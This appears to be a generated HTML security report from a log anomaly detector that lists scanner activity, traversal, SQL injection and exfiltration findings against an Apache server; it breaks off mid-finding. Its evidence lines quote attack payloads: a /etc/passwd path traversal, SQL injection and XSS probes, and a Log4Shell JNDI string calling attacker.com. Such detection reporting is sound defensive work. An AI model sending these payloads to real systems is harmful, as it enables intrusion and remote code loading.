@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTIL Log Anomaly Report — 2026-04-15 13:15</title>
+<style>
+  :root {
+    --bg: #0f172a; --surface: #1e293b; --surface2: #334155;
+    --text: #e2e8f0; --text2: #94a3b8; --accent: #38bdf8;
+    --border: #475569; --radius: 8px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; padding: 2rem; }
+  h1 { font-size: 1.8rem; color: var(--accent); margin-bottom: 0.25rem; }
+  h2 { font-size: 1.2rem; color: var(--text2); margin: 2rem 0 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
+  h3 { font-size: 1rem; margin-bottom: 0.5rem; }
+  .meta { color: var(--text2); font-size: 0.85rem; margin-bottom: 2rem; }
+  .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-bottom: 2rem; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem; }
+  .stat-number { font-size: 2.5rem; font-weight: 700; line-height: 1; }
+  .stat-label  { font-size: 0.8rem; color: var(--text2); margin-top: 0.25rem; text-transform: uppercase; letter-spacing: 0.05em; }
+  .risk-score { font-size: 4rem; font-weight: 700; color: #ef4444; text-align: center; }
+  .risk-label { text-align: center; font-size: 1.1rem; color: #ef4444; font-weight: 600; }
+  .finding-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 1rem; overflow: hidden; }
+  .finding-header { display: flex; align-items: center; gap: 1rem; padding: 1rem 1.25rem; border-bottom: 1px solid var(--border); }
+  .severity-badge { padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.75rem; font-weight: 700; white-space: nowrap; }
+  .finding-body { padding: 1rem 1.25rem; }
+  .finding-desc { color: var(--text2); font-size: 0.9rem; margin-bottom: 0.75rem; }
+  .tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-bottom: 0.75rem; }
+  .tag { background: var(--surface2); border-radius: 4px; padding: 0.15rem 0.5rem; font-size: 0.75rem; color: var(--text2); }
+  .mitre { background: #1a1a2e; border: 1px solid #3a3a6e; border-radius: 4px; padding: 0.15rem 0.5rem; font-size: 0.75rem; color: #818cf8; }
+  .evidence-block { background: #0a0a0a; border: 1px solid var(--border); border-radius: 4px; padding: 0.75rem; margin-top: 0.5rem; overflow-x: auto; }
+  .evidence-block code { font-size: 0.72rem; color: #86efac; font-family: 'Courier New', monospace; white-space: pre-wrap; word-break: break-all; }
+  .meta-row { display: flex; gap: 2rem; flex-wrap: wrap; font-size: 0.8rem; color: var(--text2); margin-bottom: 0.5rem; }
+  .meta-row span { display: flex; align-items: center; gap: 0.25rem; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  th, td { text-align: left; padding: 0.6rem 0.75rem; border-bottom: 1px solid var(--border); }
+  th { color: var(--text2); font-weight: 500; }
+  td { color: var(--text); }
+  tr:hover td { background: var(--surface2); }
+  .badge { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: 0.2rem 0.6rem; font-size: 0.75rem; margin-right: 0.4rem; }
+  .score-bar-wrap { background: var(--surface2); border-radius: 4px; height: 6px; margin-top: 0.5rem; }
+  .score-bar { border-radius: 4px; height: 6px; }
+  .no-findings { text-align: center; color: var(--text2); padding: 3rem; font-size: 1.1rem; }
+  .filter-row { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+  .filter-btn { background: var(--surface2); border: 1px solid var(--border); color: var(--text); border-radius: 4px; padding: 0.3rem 0.8rem; cursor: pointer; font-size: 0.85rem; }
+  .filter-btn.active { border-color: var(--accent); color: var(--accent); }
+</style>
+</head>
+<body>
+
+<h1>🛡️ Log Anomaly Detection Report</h1>
+<div class="meta">
+  Generated: Wednesday, 15 April 2026 at 13:15 UTC &nbsp;·&nbsp;
+  Log format: <strong>apache</strong> &nbsp;·&nbsp;
+  Analysis duration: <strong>0.6s</strong> &nbsp;·&nbsp;
+  Detectors: <span class='badge'>Pattern</span><span class='badge'>Statistical</span><span class='badge'>ML</span><span class='badge'>Temporal</span>
+</div>
+
+<!-- Summary Stats -->
+<div class="grid-4">
+  <div class="card">
+    <div class="stat-number">2,161</div>
+    <div class="stat-label">Total log lines</div>
+  </div>
+  <div class="card">
+    <div class="stat-number">2,161</div>
+    <div class="stat-label">Successfully parsed</div>
+  </div>
+  <div class="card">
+    <div class="stat-number">20</div>
+    <div class="stat-label">Anomalies found</div>
+  </div>
+  <div class="card">
+    <div class="stat-number" style="color:#fca5a5">15</div>
+    <div class="stat-label">Critical findings</div>
+  </div>
+</div>
+
+<div class="grid-2">
+  <!-- Risk Score -->
+  <div class="card">
+    <h3>Overall Risk Score</h3>
+    <div class="risk-score">81</div>
+    <div class="risk-label">CRITICAL RISK</div>
+    <div style="margin-top:1rem; font-size:0.8rem; color:var(--text2)">
+      Composite score based on severity distribution and finding count (0–100).
+    </div>
+  </div>
+
+  <!-- Severity Breakdown -->
+  <div class="card">
+    <h3>Findings by Severity</h3>
+    
+    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem">
+      <span style="width:70px;font-size:0.8rem;color:#7f1d1d">🔴 CRITICAL</span>
+      <div style="flex:1;background:var(--surface2);border-radius:4px;height:8px">
+        <div style="width:75%;background:#ef4444;border-radius:4px;height:8px"></div>
+      </div>
+      <span style="font-size:0.85rem;color:var(--text2);width:40px;text-align:right">15</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem">
+      <span style="width:70px;font-size:0.8rem;color:#78350f">🟠 HIGH</span>
+      <div style="flex:1;background:var(--surface2);border-radius:4px;height:8px">
+        <div style="width:20%;background:#f97316;border-radius:4px;height:8px"></div>
+      </div>
+      <span style="font-size:0.85rem;color:var(--text2);width:40px;text-align:right">4</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem">
+      <span style="width:70px;font-size:0.8rem;color:#1e3a5f">🟡 MEDIUM</span>
+      <div style="flex:1;background:var(--surface2);border-radius:4px;height:8px">
+        <div style="width:5%;background:#3b82f6;border-radius:4px;height:8px"></div>
+      </div>
+      <span style="font-size:0.85rem;color:var(--text2);width:40px;text-align:right">1</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem">
+      <span style="width:70px;font-size:0.8rem;color:#14532d">🟢 LOW</span>
+      <div style="flex:1;background:var(--surface2);border-radius:4px;height:8px">
+        <div style="width:0%;background:#22c55e;border-radius:4px;height:8px"></div>
+      </div>
+      <span style="font-size:0.85rem;color:var(--text2);width:40px;text-align:right">0</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem">
+      <span style="width:70px;font-size:0.8rem;color:#374151">⚪ INFO</span>
+      <div style="flex:1;background:var(--surface2);border-radius:4px;height:8px">
+        <div style="width:0%;background:#6b7280;border-radius:4px;height:8px"></div>
+      </div>
+      <span style="font-size:0.85rem;color:var(--text2);width:40px;text-align:right">0</span>
+    </div>
+  </div>
+</div>
+
+<!-- Top IPs -->
+<h2>Top Source IPs by Risk</h2><div class="card"><table><thead><tr><th>IP Address</th><th>Findings</th><th>Max Score</th><th>Finding Types</th></tr></thead><tbody><tr><td>198.51.100.23</td><td>9</td><td>100</td><td style='font-size:0.8em'>request_rate_spike, sensitive_file_access, ml_behavioural_anomaly</td></tr><tr><td>45.33.32.156</td><td>6</td><td>100</td><td style='font-size:0.8em'>sensitive_file_access, ml_behavioural_anomaly, path_traversal</td></tr><tr><td>185.220.101.5</td><td>1</td><td>100</td><td style='font-size:0.8em'>large_response_bytes</td></tr><tr><td>203.0.113.77</td><td>1</td><td>95</td><td style='font-size:0.8em'>log4shell</td></tr><tr><td>192.168.1.17</td><td>1</td><td>56</td><td style='font-size:0.8em'>ml_behavioural_anomaly</td></tr><tr><td>10.0.0.5</td><td>1</td><td>40</td><td style='font-size:0.8em'>web_path_enumeration</td></tr></tbody></table></div>
+
+<!-- Findings -->
+<h2>Anomaly Findings (20)</h2>
+
+<div class="filter-row">
+  <button class="filter-btn active" onclick="filterFindings('all')">All (20)</button>
+  <button class="filter-btn" onclick="filterFindings('critical')">🔴 CRITICAL (15)</button><button class="filter-btn" onclick="filterFindings('high')">🟠 HIGH (4)</button><button class="filter-btn" onclick="filterFindings('medium')">🟡 MEDIUM (1)</button>
+</div>
+
+<div id="findings-container">
+
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Scanner Useragent</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Known scanner or attack tool user-agent detected (78 events) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:01:36</span><span>📊 78 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-0'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-0" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:01:36 +0000] &quot;GET /20 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:02:00 +0000] &quot;GET /32 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:20 +0000] &quot;GET /12 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:24 +0000] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:58 +0000] &quot;GET /31 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Path Traversal</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Path traversal / directory traversal attempt (23 events) [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:09:12</span><span>📊 23 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1083/" target="_blank" class="mitre" title="Discovery">T1083 File and Directory Discovery</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-1'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-1" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:09:12 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:05:44 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:05:04 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:04:00 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:06:08 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Sensitive File Access</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Attempt to access sensitive file or configuration (23 events) [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:09:12</span><span>📊 23 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" class="mitre" title="Credential Access">T1552.001 Credentials In Files</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-2'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-2" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:09:12 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:05:44 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:05:04 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:04:00 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:06:08 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Request Rate Spike</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">IP 198.51.100.23 sent 30 requests/minute (Z-score: 6.4, threshold: 120 RPM). Possible brute force or DDoS. [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:01:36</span><span>📊 78 event(s)</span><span>🔧 Statistical Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1110/" target="_blank" class="mitre" title="Credential Access">T1110 Brute Force</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-3'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-3" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:01:36 +0000] &quot;GET /20 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:02:00 +0000] &quot;GET /32 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:20 +0000] &quot;GET /12 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:24 +0000] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:58 +0000] &quot;GET /31 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Large Response Bytes</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Unusually large response: 9,999,999 bytes (Z-score: 46.3, mean: 22,593). Possible data exfiltration or misconfiguration.</p>
+    <div class="meta-row"><span>📡 185.220.101.5</span><span>🕐 2024-10-14 11:00:00</span><span>📊 1 event(s)</span><span>🔧 Statistical Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1030/" target="_blank" class="mitre" title="Exfiltration">T1030 Data Transfer Size Limits</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-4'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
+        </a>
+        <div id="ev-4" class="evidence-block" style="display:none">
+          <code>185.220.101.5 - - [14/Oct/2024:11:00:00 +0000] &quot;GET /api/v1/users?export=all HTTP/1.1&quot; 200 9999999 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Path Enumeration</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">IP 198.51.100.23 accessed 78 unique paths (Z-score: 6.2). Consistent with directory/content scanning. [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:01:36</span><span>📊 78 event(s)</span><span>🔧 Statistical Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" class="mitre" title="Reconnaissance">T1595.003 Wordlist Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-5'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-5" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:01:36 +0000] &quot;GET /20 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:02:00 +0000] &quot;GET /32 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:20 +0000] &quot;GET /12 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:24 +0000] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:58 +0000] &quot;GET /31 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Ml Behavioural Anomaly</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">ML anomaly detected for source 45.33.32.156 (anomaly score: 91/100). [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:08:00</span><span>📊 80 event(s)</span><span>🔧 ML Detector (Isolation Forest)</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-6'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-6" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:08:00 +0000] &quot;GET /?id=1' OR '1'='1 HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:03:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:09:12 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:07:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:01:52 +0000] &quot;GET /?id=1' OR '1'='1 HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Ml Behavioural Anomaly</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 100/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:100%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">ML anomaly detected for source 198.51.100.23 (anomaly score: 100/100). Accessed 78 unique paths. High error rate: 100%. [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:01:36</span><span>📊 78 event(s)</span><span>🔧 ML Detector (Isolation Forest)</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-7'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-7" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:01:36 +0000] &quot;GET /20 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:02:00 +0000] &quot;GET /32 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:20 +0000] &quot;GET /12 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:24 +0000] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:58 +0000] &quot;GET /31 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Scanner Useragent</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 95/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:95%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Known scanner or attack tool user-agent detected (80 events) [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:08:00</span><span>📊 80 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-8'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-8" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:08:00 +0000] &quot;GET /?id=1' OR '1'='1 HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:03:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:09:12 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:07:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:01:52 +0000] &quot;GET /?id=1' OR '1'='1 HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Log4Shell</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 95/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:95%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Log4Shell (CVE-2021-44228) exploitation attempt (1 event)</p>
+    <div class="meta-row"><span>📡 203.0.113.77</span><span>🕐 2024-10-14 10:00:00</span><span>📊 1 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" class="mitre" title="Initial Access">T1190 Exploit Public-Facing Application</a><a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" class="mitre" title="Execution">T1059.001 PowerShell</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-9'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
+        </a>
+        <div id="ev-9" class="evidence-block" style="display:none">
+          <code>203.0.113.77 - - [14/Oct/2024:10:00:00 +0000] &quot;GET / HTTP/1.1&quot; 200 5120 &quot;-&quot; &quot;${jndi:ldap://attacker.com:1389/Exploit}&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Sql Injection</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 95/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:95%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">SQL Injection attempt detected in request (1 event) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:00:12</span><span>📊 1 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" class="mitre" title="Initial Access">T1190 Exploit Public-Facing Application</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-10'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
